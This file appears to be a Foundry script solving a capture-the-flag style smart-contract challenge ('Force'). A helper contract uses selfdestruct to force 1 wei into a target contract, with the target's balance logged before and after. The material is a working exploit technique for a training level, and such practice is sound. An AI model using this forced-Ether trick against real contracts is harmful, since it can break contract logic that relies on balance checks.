// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/07-Force.sol";

contract Hack{
    constructor(address _target) payable {
        selfdestruct(payable(_target));
    }
}

contract ForceSolution is Script {
    Force public forceInstance = Force(0x0A2C8aaa93c232C3AecD0112D6C7FDa68A0c57A5);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Balance before hack: ", address(forceInstance).balance);
        
        new Hack{value: 1 wei}(address(forceInstance));
        
        console.log("Balance after hack: ", address(forceInstance).balance);
        
        vm.stopBroadcast();
    }
}